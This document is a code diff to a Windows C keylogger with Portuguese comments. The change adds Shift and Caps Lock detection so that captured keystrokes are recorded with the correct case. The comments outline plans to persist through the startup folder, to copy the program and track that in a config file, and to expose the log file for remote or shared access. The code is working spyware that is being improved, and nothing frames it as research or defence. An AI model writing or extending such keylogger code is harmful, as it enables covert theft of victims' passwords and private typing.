@@ -4,6 +4,7 @@
 #include <stdlib.h>
 #include <stdbool.h>
 #include <shlobj.h>
+#include <ctype.h>
 
 bool valPersis();
 
@@ -68,11 +69,19 @@ int main()
                         }
 
                         //  Salvando as teclas e montando a palavra
+                        bool shiftPressed = ((GetAsyncKeyState(VK_SHIFT) & 0x8000) != 0) || ((GetKeyState(VK_CAPITAL) & 0x0001) != 0);
                         if ((vk >= '0' && vk <= '9') || (vk >= 'A' && vk <= 'Z') || (vk >= 'a' && vk <= 'z'))
                         {
                             if (count < sizeof(palavra) - 1)
                             {
-                                palavra[count++] = (char)vk;
+                                char c = (char)vk;
+
+                                if (!shiftPressed)
+                                {
+                                    c = tolower(c);
+                                }
+
+                                palavra[count++] = c;
                                 palavra[count] = '\0';
                             }
                         }
@@ -143,5 +152,4 @@ bool valPersis()
 
 // Servir esse arquivo de log abrindo um caminho para acesso remoto ou compartilhando esse arquivo localmente
 // shell:startup
-// se auto copiar
 // ao inves de ter que criar dois arquivos vou fazer um arquivo config onde vai ser salvo se o arquivo ja foi copiado ou nao
